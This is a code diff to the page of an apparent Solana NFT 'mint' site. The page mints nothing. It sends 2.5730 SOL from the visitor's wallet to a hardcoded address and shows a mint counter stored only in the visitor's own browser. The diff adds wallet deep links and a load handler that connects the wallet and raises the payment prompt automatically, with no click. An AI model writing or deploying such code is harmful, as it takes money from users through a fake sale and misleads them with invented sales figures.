@@ -38,7 +38,10 @@
     <p class="price">2.5730 SOL</p>
     <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>
 
-    <button id="connectBtn">CONNECT & MINT</button>
+    <!-- CHOOSE WALLET -->
+    <button onclick="openWallet('phantom')">Phantom</button>
+    <button onclick="openWallet('trust')">Trust Wallet</button>
+    <button onclick="openWallet('metamask')">MetaMask</button>
 
     <div id="status" class="status"></div>
   </div>
@@ -47,99 +50,74 @@
 
   <script>
     const PRICE = 2.5730 * 1e9;
-    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // YOUR MAIN WALLET
-    let provider = null;
-    let count = localStorage.getItem('softfund') ? parseInt(localStorage.getItem('softfund')) : 0;
+    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // YOUR WALLET
+    let count = localStorage.getItem('softfund_mint') ? parseInt(localStorage.getItem('softfund_mint')) : 0;
     document.getElementById('minted').textContent = count;
 
     const status = document.getElementById("status");
-    const btn = document.getElementById("connectBtn");
 
     function setStatus(txt, color) {
       status.innerHTML = txt;
       status.style.color = color;
     }
 
-    // Detect wallet
-    function getProvider() {
-      if (window.solana?.isPhantom) return window.solana;
-      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
-      if (window.ethereum?.isMetaMask) return window.ethereum;
-      return null;
-    }
+    // OPEN WALLET APP FROM CHROME
+    function openWallet(type) {
+      const url = location.href;
+      let deepLink = "";
 
-    // Connect + Mint
-    async function connectAndMint() {
-      provider = getProvider();
-      if (!provider) {
-        setStatus("Open in Phantom, Trust, or MetaMask", "#ff5555");
-        return;
+      if (type === 'phantom') {
+        deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
+      } else if (type === 'trust') {
+        deepLink = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
+      } else if (type === 'metamask') {
+        deepLink = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
       }
 
-      btn.disabled = true;
-      setStatus("Connecting... <span class='loader'></span>", "#ffd700");
-
-      try {
-        // Connect
-        if (!provider.isConnected) {
-          await provider.connect();
-        }
-
-        setStatus("Connected! Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");
-
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const tx = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: provider.publicKey,
-            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
-            lamports: PRICE,
-          })
-        );
-
-        const { blockhash } = await connection.getLatestBlockhash();
-        tx.recentBlockhash = blockhash;
-        tx.feePayer = provider.publicKey;
-
-        // THIS TRIGGERS THE PAYMENT POPUP
-        const signed = await provider.signAndSendTransaction(tx);
-
-        await connection.confirmTransaction(signed.signature);
-
-        count++;
-        localStorage.setItem('softfund', count);
-        document.getElementById('minted').textContent = count;
-
-        setStatus(`MINTED! <a href="https://solscan.io/tx/${signed.signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
-
-        setTimeout(() => {
-          btn.disabled = false;
-          setStatus("");
-        }, 4000);
-
-      } catch (err) {
-        console.error(err);
-        setStatus("Payment rejected or failed", "#ff5555");
-        btn.disabled = false;
-      }
+      setStatus("Opening wallet... <span class='loader'></span>", "#ffd700");
+      location.href = deepLink;
     }
 
-    // Auto-run when in wallet
+    // RUN ONLY INSIDE WALLET BROWSER
     window.addEventListener("load", () => {
-      if (getProvider()) {
-        btn.textContent = "MINT NOW";
-        btn.onclick = connectAndMint;
-      } else {
-        btn.textContent = "OPEN IN WALLET APP";
-        btn.onclick = () => {
-          const url = location.href;
-          const phantom = `https://phantom.app/ul/browse/${encodeURIComponent(url)}`;
-          const trust = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
-          const mm = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
-          location.href = phantom;
-          setTimeout(() => location.href = trust, 1500);
-          setTimeout(() => location.href = mm, 3000);
-        };
-      }
+      const provider = window.solana || window.trustwallet?.Provider?.solana || window.ethereum;
+      if (!provider) return;
+
+      // Auto-connect & mint
+      (async () => {
+        try {
+          setStatus("Connecting... <span class='loader'></span>", "#ffd700");
+          if (!provider.isConnected) await provider.connect();
+
+          setStatus("Connected! Preparing payment... <span class='loader'></span>", "#ffd700");
+
+          const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+          const tx = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+              fromPubkey: provider.publicKey,
+              toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
+              lamports: PRICE,
+            })
+          );
+
+          const { blockhash } = await connection.getLatestBlockhash();
+          tx.recentBlockhash = blockhash;
+          tx.feePayer = provider.publicKey;
+
+          // THIS TRIGGERS THE PAYMENT POPUP
+          const signed = await provider.signAndSendTransaction(tx);
+          await connection.confirmTransaction(signed.signature);
+
+          count++;
+          localStorage.setItem('softfund_mint', count);
+          document.getElementById('minted').textContent = count;
+
+          setStatus(`MINTED! <a href="https://solscan.io/tx/${signed.signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
+
+        } catch (err) {
+          setStatus("Payment failed or rejected", "#ff5555");
+        }
+      })();
     });
   </script>
 </body>
